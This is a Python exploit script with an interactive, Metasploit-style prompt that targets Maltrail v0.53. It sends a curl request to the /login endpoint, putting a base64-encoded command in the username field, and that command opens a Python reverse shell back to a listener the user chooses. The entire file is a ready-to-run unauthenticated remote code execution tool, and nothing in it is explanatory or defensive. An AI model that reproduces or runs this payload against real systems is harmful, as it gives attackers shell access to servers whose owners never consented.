import os
import base64

def main_reverse_shell(data):
	# listening_IP = sys.argv[1]
	# listening_PORT = sys.argv[2]
	# target_URL = sys.argv[3] + "/login"

	listening_IP = data["lhost"]
	listening_PORT = data["lport"]
	target_URL = data["url"] + "/login"

	print("Running exploit on " + str(target_URL))
	curl_cmd(listening_IP, listening_PORT, target_URL)

def curl_cmd(my_ip, my_port, target_url):
	payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
	encoded_payload = base64.b64encode(payload.encode()).decode()
	command = f"curl '{target_url}' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
	os.system(command)






print("\nMaltrail-v0.53-reverse-shell...\n\n")

class StartUp:
    def __init__(self):
        self.command_name = "Maltrail-v0.53>"
        self.help_command_text = "\nset lhost 192.168.10.101\nset lport 5050\nset url http://192.168.10.102:55555"

        self.data = {
            "lhost"   : "",
            "lport" : "",
            "url" : ""
        }

        self.start()

    def set_command(self, command):
        try:
            for i in range(len(command)):
                self.data[command[1].lower()] = command[2]
        except:
            pass

        print(self.data)

    def exploit_run_command(self):
        main_reverse_shell(self.data)

    def help_command(self):
        print("")
        print(self.help_command_text)
        print("")

    def show_options_command(self):
        print("")
        for name, inside in self.data.items():
            print(f"{name}: {inside}")
        print("")

    def start(self):
        while True:
            comman = input(self.command_name).split(" ")
            command = [item for item in comman if item != '']

            if command[0].lower() == "exit":
                break
            if command[0].lower() == "help":
                self.help_command()
            elif command[0].lower() == "set":
                self.set_command(command)
            elif command[0].lower() == "show" and command[1].lower() == "options":
                self.show_options_command()
            elif command[0].lower() == "run" or command[0].lower() == "exploit":
                self.exploit_run_command()

StartUp()